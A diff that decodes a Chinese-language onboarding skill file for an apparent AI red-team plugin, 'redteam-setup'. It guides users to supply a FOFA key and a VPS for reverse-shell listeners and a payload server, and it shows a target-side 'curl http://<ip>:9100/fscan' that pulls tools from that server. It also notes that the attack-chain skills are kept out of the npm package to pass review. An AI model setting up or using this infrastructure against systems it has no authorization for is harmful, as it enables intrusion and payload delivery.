@@ -1,1 +1,99 @@
-LS0tCm5hbWU6IHJlZHRlYW0tc2V0dXAKZGVzY3JpcHRpb246IOmmluasoeS9v+eUqOW8leWvvO+8muW8leWvvOaPkOS+myBGT0ZBX0tFWSDkuI4gVlBTIOeZu+W9leaWueW8j+OAgemqjOivgemAmumBk+WPr+eUqOOAgee7meWHuumZjee6p+WPo+W+hO+8iOW3peWFt+mTvueUseW3peWFt+eusemZhOS7tuaMiemcgOiOt+WPlu+8iQp3aGVuVG9Vc2U6IOeUqOaIt+esrOS4gOasoeS9v+eUqOe6oumYn+aooeW8j+aXtu+8m+aIliByZWR0ZWFtX3ByZWZsaWdodCDmiqXlh7ogb25ib2FyZGluZy5pbmNvbXBsZXRlIC8g5pyJ5oqA6IO9IGJyb2tlbiDml7bvvJvmiJbnlKjmiLfor7Qi546v5aKD5rKh6YWN5aW9IiLlt6Xlhbfoo4XkuIDkuIsiCnJvbGU6IHBsYW4KZW5hYmxlZDogdHJ1ZQotLS0KCiMg6aaW5qyh5L2/55So5byV5a+877yI5oqK546v5aKD5LiA5qyh6YWN6b2Q77yJCgoqKuinpuWPkeadoeS7tioq77yI5ruh6Laz5Lu75LiA5Y2z5omn6KGM5pys5oqA6IO977yM5LiN6KaB6Lez6L+H77yJ77yaCi0gYHJlZHRlYW1fcHJlZmxpZ2h0YCDov5Tlm57ph4wgYG9uYm9hcmRpbmcuY29tcGxldGU9ZmFsc2Vg77ybCi0gcHJlZmxpZ2h0IOaciSBgYnJva2VuYCDmioDog73kuJTljp/lm6DmmK8i57y6546v5aKD5Y+Y6YePIuaIliJWUFMg6L+Y5piv5Y2g5L2N56ymIu+8mwotIOeUqOaIt+esrOS4gOasoei/m+e6oumYn+aooeW8j+OAgeaIluaYjuehruivtCLnjq/looMv5bel5YW35rKh6YWN5aW9IuOAggoKKirmoLjlv4Pljp/liJkqKu+8mioq5LiA5qyh5oCn5oqK6K+d6K+05a6M77yM5LiA5qyh6KaB6b2QKirjgILkuI3opoHmjKTniZnoho/lvI/lj43lpI3mib7nlKjmiLfopoHkuJzopb/igJTigJTpgqPmmK/ov5nlpZflvJXlr7zlrZjlnKjnmoTllK/kuIDnkIbnlLHjgIIKCiMjIOS4gOOAgeWFiOehruiupOS9oOacieayoeaciSLlt6XlhbfnrrEi77yIbnBtIOeJiOm7mOiupOayoeacie+8iQoKbnBtIOeJiCBgZHNoLXJlZHRlYW0tbW9kZWAgKirkuI3pmo/ljIXliIblj5Hlt6Xlhbflronoo4XohJrmnKzkuI4gOSDku73mlLvlh7vpk77mioDog70qKu+8iOmap+mBkyAvIOWHreaNriAvCldlYlNoZWxsIC8g5Y+N5by5IFNoZWxsIC8g5qiq5ZCR56e75YqoIC8g5pyq5o6I5p2D5Yip55So77yJ44CC5Y6f5Zug77yabnBtIOeahOWPkeW4g+acn+iHquWKqOWuoeafpeS8muaKigoi5YyF5Zyo5a6J6KOF5ZCO6Ieq5Yqo5LiL6L295riX6YCP5LqM6L+b5Yi2IuWIpOWumuS4uuaBtuaEj+ihjOS4uueJueW+ge+8jOaVtOWMheS8muiiqyBCbG9ja2Vk44CCCgotICoq5pyJKiogYCREU0hfSE9NRS9yZWR0ZWFtL3NldHVwLnNoYO+8iOiHquihjOWPlui/h+W3peWFt+euseOAgeaIlumdniBucG0g5a6J6KOF77yJ4oaSIOaMieS4i+mdouesrOS4gOOAgeS6jOiKgui1sO+8mwotICoq5rKh5pyJKirvvIhgcmVkdGVhbV9wcmVmbGlnaHRgIOi/lOWbnumHjCBgb25ib2FyZGluZy5zZXR1cF9zY3JpcHQuZXhpc3RzPWZhbHNlYO+8ieKGkiDlhYjljrvpobnnm64KICBHaXRIdWIgUmVsZWFzZSDkuIvovb0gYGRzaC1yZWR0ZWFtLW1vZGUtPOeJiOacrD4tdG9vbGtpdC50YXIuZ3pg77yM6Kej5Y6L5ZCO5oyJ5YW25LitIFJFQURNRQogICoq55Sx55So5oi36Ieq5bex5omn6KGMKirvvIzlho3liLDnrKzkuInoioLmiYvliqjphY0gYEZPRkFfS0VZYCDkuI4gVlBT77ybCi0gKirpg73kuI3opoEqKuS5n+ihjO+8muWPqueUqOacrOWMheiHquW4pueahCAxNCDkuKrkvqblr58v5qOA5rWL5ZCR5oqA6IO977yIYGZvZmEtcmVjb25gIC8gYGFjdGl2ZS1zY2FuYCAvCiAgYG51Y2xlaS1zY2FuYCAvIGB3ZWItZmluZ2VycHJpbnRgIC8gYGRpci1icnV0ZWZvcmNlYCDnrYnvvInkuZ/og73lvIDlt6XvvIzlj6rmmK/mi7/kuI3liLDpnIDopoHokL3lnLDnmoTmiJDmnpzjgIIKCj4gKirnuqLnur8qKu+8muacrOaPkuS7tioq5LiN5pu/55So5oi35LiL6L295oiW5a6J6KOF5Lu75L2V5a6J5YWo5bel5YW3KirjgILpnIDopoHku4DkuYjvvIzor7TmuIXojrflj5bkvY3nva7vvIznlLHnlKjmiLfoh6rlt7Hlj5bjgIHoh6rlt7HmiafooYzjgIIKCiMjIOS6jOOAgeimgeeUqOaIt+aPkOS+m+S7gOS5iO+8iOS4gOasoeWIl+a4he+8jOivtOa4hSLkuLrku4DkuYgi5ZKMIue7meWIsOWTqiLvvIkKCnwg6KaB5LuA5LmIIHwg5Li65LuA5LmI5b+F6aG7IHwg57uZ5Yiw5ZOqIHwg5rKh5pyJ5Lya5oCO5qC3IHwKfCAtLS0gfCAtLS0gfCAtLS0gfCAtLS0gfAp8ICoqRk9GQV9LRVkqKiB8IOi1hOS6p+a1i+e7mO+8iGBmb2ZhLXJlY29uYO+8iemdoOWug+mTuuW8gOWNleS9jeS6kuiBlOe9kei1hOS6p+mdou+8m+ayoeacieWwseWPquiDvemdoCBjcnQuc2ggKyDlrZDln5/mnprkuL7vvIwqKui+uee8mOi1hOS6p+S4juacquWkh+ahiOi1hOS6p+S8muWkp+mHj+a8j+aOiSoqIHwg546v5aKD5Y+Y6YePIGBGT0ZBX0tFWWDvvIzmiJblhpnov5sgYCREU0hfSE9NRS8uZW52YO+8iOiEmuacrOS8muS7o+WGme+8iSB8IOa1i+e7mOiDveWKm+mZjee6p++8muaJvuS4jeWFqOi1hOS6pyDihpIg5ZCO6Z2i5Zub5Liq6Zi25q616YO95Y+X5b2x5ZONIHwKfCAqKlZQUyDnmbvlvZXmlrnlvI8qKu+8iGB1c2VyQGlwYCArIOengemSpei3r+W+hO+8iSB8IOWPjeW8uSBTaGVsbCDlv4XpobvokL3liLAqKuWFrOe9keWPr+aOp+S4u+acuioq5LiK77yb6L296I235oqV6YCS44CB6Zqn6YGT5Lit6L2s5Lmf5L6d6LWW5a6DIHwgYFJFRFRFQU1fVlBTX0hPU1Rg77yIYOeUqOaIt0DkuLvmnLpg77yJLyBgUkVEVEVBTV9WUFNfS0VZYO+8iOengemSpei3r+W+hO+8jOm7mOiupCBgJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC92cHMvaWRfcnNhYO+8iSB8IOaLv+S4jeWIsOacjeWKoeWZqOadg+mZkOOAgeaKlemAkuS4jeS6hui9veiNt+OAgei/m+S4jeS6huWGhee9kSB8Cnwg77yI5Y+v6YCJ77yJ5rWL57uY5bmz5Y+wIGtleSB8IFF1YWtlIC8gSHVudGVyIC8gWm9vbUV5ZSDkuI4gRk9GQSDnu5Pmnpzlt67lvILlpKfvvIzkuqTlj4nog73lpJrmib7lh7rotYTkuqcgfCDnjq/looPlj5jph4/vvIzmjInpnIAgfCDlsJHkuIDot6/kuqTlj4npqozor4EgfAp8IO+8iOWPr+mAie+8ieWFgeiuuCBhcHQg5a6J6KOFIHwg6KGl57O757uf5bel5YW3IHwg55So5oi36Ieq5bex5omn6KGMIGBzdWRvIGFwdCBpbnN0YWxsIOKApmAgfCDnm7jlhbPmioDog73pmY3nuqcgfAoKKiror53mnK/opoHmsYIqKu+8muWIl+WujOWQjioq562J55So5oi36KGl6b2QKirjgILkuI3opoHnlKgi5oiR5YWI55So6ZmN57qn5pa55qGI5byA5belIueziui/h+WOu+KAlOKAlOmZpOmdnueUqOaIt+aYjuehruivtCLlsLHmjInnjrDmnInmnaHku7bmiZMi44CCCgoqKuazqOaEjyoq77ya55So5oi355qEIGtleSAqKuS4jeimgeWGmei/m+S7k+W6k+OAgeS4jeimgei0tOi/m+aKpeWRiuOAgeS4jeimgeWcqCBgcmVkdGVhbV9jaGFpbl9hZGRgIOeahCBgdG9vbGAg5a2X5q616YeM5Ye6546wKirjgIIK5YaZ6L+bIGAkRFNIX0hPTUUvLmVudmDvvIjohJrmnKzlt7IgYGNobW9kIDYwMGDvvInljbPlj6/jgIIKCiMjIyBGT0ZBX0tFWSDmgI7kuYjmi7/vvIjopoHog73mjIflr7znlKjmiLfvvIkKMS4g55m75b2VIDxodHRwczovL2ZvZmEuaW5mbz4g4oaSIOWPs+S4iuinkuWktOWDjyDihpIgKirkuKrkurrkuK3lv4Mg4oaSIEFQSSBLZXkqKu+8mwoyLiDkuKrkurrniYjpmZDpop3vvJoxMCwwMDAg5qyh5p+l6K+iL+aciOOAgTEg56eSIDEg5qyh5bm25Y+R77yIKirohJrmnKzkuI7mioDog73pg73mjIkgMSDnp5IgMSDmrKHpmZDpgJ/vvIzkuI3opoHosIPpq5gqKu+8jOi2heS6huS8muinpuWPkSA0NTAxMiDlsIHnpoHvvInvvJsKMy4g5ou/5Yiw5ZCO5Y+v5Lul6Ieq5rWL77yaYGN1cmwgLXMgImh0dHBzOi8vZm9mYS5pbmZvL2FwaS92MS9pbmZvL215P2tleT08S0VZPiJgIOKAlOKAlCDov5Tlm54gYCJlcnJvciI6ZmFsc2VgIOWNs+acieaViOOAggoKIyMjIFZQUyDmgI7kuYjlh4blpIfvvIjopoHog73mjIflr7znlKjmiLfvvIkKLSDkuIDlj7AqKuWFrOe9keWPr+i+vioq55qEIExpbnV4IFZQU++8iDEg5qC4IDFHIOWkn+eUqO+8ie+8jOWuieWFqOe7hOaUvuihjO+8mmAyMmDvvIhTU0jvvInjgIFgOTAwMC05OTk5YO+8iOWPjeW8uSBTaGVsbCDnm5HlkKzmrrXvvInjgIFgOTEwMGDvvIjovb3ojbfliIblj5HvvInvvJsKLSDnlJ/miJAv5pS+572uIFNTSCDnp4HpkqXliLAgYCREU0hfSE9NRS9yZWR0ZWFtL3Rvb2xraXQvdnBzL2lkX3JzYWDvvIzmnYPpmZDlv4XpobsgYGNobW9kIDYwMGDvvJsKLSDnoa7orqTov57pgJrvvJpgc3NoIC1pIDznp4HpkqU+IDx1c2VyPkA8aXA+ICdlY2hvIG9rJ2DvvJsKLSAqKui9veiNt+WIhuWPkeacjeWKoSoq77yaVlBTIOS4iiBgfi9wYXlsb2FkYCDnm67lvZUgKyBgcHl0aG9uMyAtbSBodHRwLnNlcnZlciA5MTAwYO+8iHRtdXgg5bi46am777yJ77yMCiAg55uu5qCH5py65Y+vIGBjdXJsIGh0dHA6Ly88aXA+OjkxMDAvZnNjYW5gIOebtOaOpeaLieW3peWFt+OAggoKIyMg5LiJ44CB6YWN572u5a6M55qE6aqM6K+B77yI5b+F6aG75YGa5a6M5omN566X5byV5a+85oiQ5Yqf77yJCgrpgJDpobnlrp7mtYvvvIwqKuS4jeimgeWPqueciyLmlofku7blrZjlnKgiKirvvJoKCmBgYGJhc2gKIyAxKSBGT0ZBIGtleSDmnInmlYgKY3VybCAtcyAiaHR0cHM6Ly9mb2ZhLmluZm8vYXBpL3YxL2luZm8vbXk/a2V5PSRGT0ZBX0tFWSIgfCBncmVwIC1vICciZXJyb3IiOlthLXpdKicKCiMgMikgVlBTIOWPr+i+vu+8iOi9veiNt+acjeWKoeaYr+WQpuWcqOi3keeUseW3peWFt+euseeahOS9k+ajgOiEmuacrOi0n+i0o++8iQpzc2ggLWkgJERTSF9IT01FL3JlZHRlYW0vdG9vbGtpdC92cHMvaWRfcnNhIC1vIEJhdGNoTW9kZT15ZXMgPHVzZXI+QDxpcD4gJ2VjaG8gb2snCgojIDMpIOaKgOiDveazqOWGjOihqOWPr+ingQojICAgIOeUqCByZWR0ZWFtX3ByZWZsaWdodCDlpI3moLjvvIznnIsgYXZhaWxhYmxlIOWIl+ihqOmHjOWunumZheacieWTquS6m+aKgOiDvQpgYGAKCj4g5bel5YW35LqM6L+b5Yi25LiOIG51Y2xlaSDmqKHmnb/lupPnmoTkvZPmo4DnlLHlt6XlhbfnrrHph4znmoQgYHJlZHRlYW0tc2V0dXAuc2ggLS1jaGVja2Ag6LSf6LSjCj4g77yIbnBtIOeJiOS4jeWQq+ivpeiEmuacrO+8jOingeesrOS4gOiKgu+8ieOAggojIyDlm5vjgIHmnIDlkI7kuIDmraXvvJrlhpnlrozmiJDmoIforrDlubblpI3moLgKCumFjee9ruihpem9kOWQju+8jOWGmeWujOaIkOagh+iusO+8iOacieW3peWFt+euseiEmuacrOaXtuiEmuacrCBgLS15ZXNgIOS8muiHquWKqOWGme+8m+ayoeacieWwseaJi+WKqOWGme+8ie+8mgoKYGBgYmFzaApta2RpciAtcCAiJERTSF9IT01FL3JlZHRlYW0iICYmIGRhdGUgLUlzID4gIiREU0hfSE9NRS9yZWR0ZWFtLy5zZXR1cC1jb21wbGV0ZSIKYGBgCgrnhLblkI4qKuWGjei3keS4gOasoSBgcmVkdGVhbV9wcmVmbGlnaHRgKirvvIznoa7orqTvvJpgb25ib2FyZGluZy5jb21wbGV0ZT10cnVlYOOAgWBicm9rZW5gIOS4uuepuuaIluWPquWJqeeUqOaIt+aYjuehruaOpeWPl+mZjee6p+eahOmhueOAggrmiormnIDnu4jnu5PorrrmjIki6IO955So5LuA5LmIIC8g57y65LuA5LmIIC8g57y655qE5b2x5ZON5piv5LuA5LmIIuS4ieadoeaKpee7meeUqOaIt+OAggoKKirmlLnkuoYgYCREU0hfSE9NRS8uZW52YCDlkI7lv4Xpobvph43lkK8gZHNoIHdlYioq77yM5ZCm5YiZ5b2T5YmN6L+b56iL6K+75LiN5Yiw5paw55qE546v5aKD5Y+Y6YeP4oCU4oCUCui/meS4gOatpeimgeaYjuehruWRiuivieeUqOaIt++8iOaZuuiDveS9k+S4jeiDveabv+S7lumHjeWQr++8ieOAggoKIyMg5LqU44CB55So5oi35bCx5piv5LiN57uZ5p+Q5Lqb6LWE5rqQ5pe277yI6ZmN57qn5Y+j5b6E77yJCgp8IOe8uuS7gOS5iCB8IOmZjee6p+aWueahiCB8IOW/hemhu+WQkeeUqOaIt+ivtOaYjueahOmZkOWItiB8CnwgLS0tIHwgLS0tIHwgLS0tIHwKfCBGT0ZBX0tFWSB8IGNydC5zaCDor4HkuabpgI/mmI4gKyBgcGFzc2l2ZS1yZWNvbmAgKyBgcmVjb24tcGlwZWxpbmVg77yIc3ViZmluZGVyL2tzdWJkb21haW4vZG5zeO+8iSsg5pCc57Si5byV5pOO5LiO5aSH5qGI5L+h5oGvIHwgKirotYTkuqfmlLbpm4bkuI3lrozmlbQqKu+8jOacquWkh+ahiC/ovrnnvJjotYTkuqfkvJrmvI/vvJvlvpfliIbkuIrpmZDlj5flvbHlk40gfAp8IFZQUyB8IOWPquWBmuS4jemcgOimgeiQveWcsOeahOaIkOaenO+8iOi0puWPt+adg+mZkOOAgeaVsOaNruOAgeacquaOiOadg+iuv+mXruOAgVdlYlNoZWxsIOS6pOS7mO+8iSB8ICoq5ou/5LiN5Yiw5pyN5Yqh5Zmo5p2D6ZmQ44CB6L+b5LiN5LqG5YaF572RKirvvIxgYm91bmRhcnlgL2BpbnRlcm5hbGAvYGNlbnRyYWwtc3lzdGVtYCDnsbvlvpfliIbngrnln7rmnKzmlL7lvIMgfAp8IOezu+e7n+W3peWFt++8iG51Y2xlaSDnrYnvvIkgfCDnlKjlt6XlhbfnrrHph4znmoTmm7/ku6Plk4HvvIhodHRweC9zdWJmaW5kZXIg5LuN5Zyo77yJIHwg5ryP5rSe5Y+R546w6IO95Yqb5aSn5bmF5LiL6ZmN77yMTmRheSDmo4DmtYvln7rmnKznmKvnl6ogfAp8IOWFqOmDqOmDveayoeaciSB8IOWPquWBmue6r+iiq+WKqOS/oeaBr+aUtumbhuS4jui1hOS6p+ais+eQhiB8IOaYjuehruWRiuivieeUqOaItyLov5nmrKHlj6rog73lgZrliLDkv6Hmga/mlLbpm4bpmLbmrrUiIHwKCioq6ZmN57qn5Yaz5a6a6KaB5YaZ6L+b5rGH5oqlKirvvJrnlKjmiLfpnIDopoHnn6XpgZPov5nmrKHmmK/lnKjku4DkuYjmnaHku7bkuIvmiZPnmoTjgIIK
+---
+name: redteam-setup
+description: 首次使用引导：引导提供 FOFA_KEY 与 VPS 登录方式、验证通道可用、给出降级口径（工具链由工具箱附件按需获取）
+whenToUse: 用户第一次使用红队模式时；或 redteam_preflight 报出 onboarding.incomplete / 有技能 broken 时；或用户说"环境没配好""工具装一下"
+role: plan
+enabled: true
+---
+
+# 首次使用引导（把环境一次配齐）
+
+**触发条件**（满足任一即执行本技能，不要跳过）：
+- `redteam_preflight` 返回里 `onboarding.complete=false`；
+- preflight 有 `broken` 技能且原因是"缺环境变量"或"VPS 还是占位符"；
+- 用户第一次进红队模式、或明确说"环境/工具没配好"。
+
+**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。
+
+## 一、先确认你有没有"工具箱"（npm 版默认没有）
+
+npm 版 `dsh-redteam-mode` **不随包分发工具安装脚本与 9 份攻击链技能**（隧道 / 凭据 /
+WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的发布期自动审查会把
+"包在安装后自动下载渗透二进制"判定为恶意行为特征，整包会被 Blocked。
+
+- **有** `$DSH_HOME/redteam/setup.sh`（自行取过工具箱、或非 npm 安装）→ 按下面第一、二节走；
+- **没有**（`redteam_preflight` 返回里 `onboarding.setup_script.exists=false`）→ 先去项目
+  GitHub Release 下载 `dsh-redteam-mode-<版本>-toolkit.tar.gz`，解压后按其中 README
+  **由用户自己执行**，再到第三节手动配 `FOFA_KEY` 与 VPS；
+- **都不要**也行：只用本包自带的 14 个侦察/检测向技能（`fofa-recon` / `active-scan` /
+  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` 等）也能开工，只是拿不到需要落地的成果。
+
+> **红线**：本插件**不替用户下载或安装任何安全工具**。需要什么，说清获取位置，由用户自己取、自己执行。
+
+## 二、要用户提供什么（一次列清，说清"为什么"和"给到哪"）
+
+| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
+| --- | --- | --- | --- |
+| **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 环境变量 `FOFA_KEY`，或写进 `$DSH_HOME/.env`（脚本会代写） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
+| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
+| （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |
+| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |
+
+**话术要求**：列完后**等用户补齐**。不要用"我先用降级方案开工"糊过去——除非用户明确说"就按现有条件打"。
+
+**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `redteam_chain_add` 的 `tool` 字段里出现**。
+写进 `$DSH_HOME/.env`（脚本已 `chmod 600`）即可。
+
+### FOFA_KEY 怎么拿（要能指导用户）
+1. 登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；
+2. 个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；
+3. 拿到后可以自测：`curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— 返回 `"error":false` 即有效。
+
+### VPS 怎么准备（要能指导用户）
+- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
+- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；
+- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；
+- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
+  目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。
+
+## 三、配置完的验证（必须做完才算引导成功）
+
+逐项实测，**不要只看"文件存在"**：
+
+```bash
+# 1) FOFA key 有效
+curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'
+
+# 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）
+ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'
+
+# 3) 技能注册表可见
+#    用 redteam_preflight 复核，看 available 列表里实际有哪些技能
+```
+
+> 工具二进制与 nuclei 模板库的体检由工具箱里的 `redteam-setup.sh --check` 负责
+> （npm 版不含该脚本，见第一节）。
+## 四、最后一步：写完成标记并复核
+
+配置补齐后，写完成标记（有工具箱脚本时脚本 `--yes` 会自动写；没有就手动写）：
+
+```bash
+mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
+```
+
+然后**再跑一次 `redteam_preflight`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。
+把最终结论按"能用什么 / 缺什么 / 缺的影响是什么"三条报给用户。
+
+**改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——
+这一步要明确告诉用户（智能体不能替他重启）。
+
+## 五、用户就是不给某些资源时（降级口径）
+
+| 缺什么 | 降级方案 | 必须向用户说明的限制 |
+| --- | --- | --- |
+| FOFA_KEY | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/ksubdomain/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；得分上限受影响 |
+| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，`boundary`/`internal`/`central-system` 类得分点基本放弃 |
+| 系统工具（nuclei 等） | 用工具箱里的替代品（httpx/subfinder 仍在） | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |
+| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户"这次只能做到信息收集阶段" |
+
+**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。
